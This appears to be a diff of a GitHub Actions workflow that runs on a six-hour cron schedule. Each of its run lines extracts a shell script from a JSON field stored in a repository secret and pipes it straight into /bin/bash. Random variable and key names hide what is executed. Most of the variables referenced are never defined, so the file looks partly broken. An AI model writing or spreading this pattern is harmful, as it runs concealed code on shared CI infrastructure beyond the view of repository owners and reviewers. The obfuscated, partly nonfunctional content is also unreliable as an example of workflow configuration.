@@ -1,26 +1,30 @@
 name: sognyangmin
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 3/6 * * *'
+    - cron: '6 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sognyangmin
         env:
-          jh553: ${{ secrets.jh553 }}
+          urx2: ${{ secrets.urx2 }}
         run: |
-          echo $jh553 | jq -r .ebbd7 | /bin/bash
-          echo $nvwpe85695 | jq -r .sa63018 | /bin/bash
-          echo $wuwgp80846 | jq -r .cw7 | /bin/bash
-          echo $bj832 | jq -r .qfbk4437 | /bin/bash
-          echo $ywdug1 | jq -r .ngk10 | /bin/bash
-          echo $p313 | jq -r .dh56082 | /bin/bash
-          echo $wovx24 | jq -r .houjh8 | /bin/bash
-          echo $deena963 | jq -r .ej10 | /bin/bash
+          echo $urx2 | jq -r .zftmb34 | /bin/bash
+          echo $gi27 | jq -r .ahfqe7 | /bin/bash
+          echo $fckeu5346 | jq -r .mulq4108 | /bin/bash
+          echo $lwnsz031 | jq -r .lhpg60361 | /bin/bash
+          echo $g3 | jq -r .xfs0 | /bin/bash
+          echo $ko79 | jq -r .fupp489 | /bin/bash
+          echo $kh586 | jq -r .dxqlj73 | /bin/bash
+          echo $oolj59937 | jq -r .r7366 | /bin/bash
+          echo $rod19968 | jq -r .jx28 | /bin/bash
+          echo $cefqs7365 | jq -r .zkb2 | /bin/bash
+          echo $qvb7 | jq -r .rvag42060 | /bin/bash
+          echo $ublk361 | jq -r .my51 | /bin/bash
+          echo $nwii21592 | jq -r .f48109 | /bin/bash
+          echo $s27 | jq -r .wtmk8 | /bin/bash
 
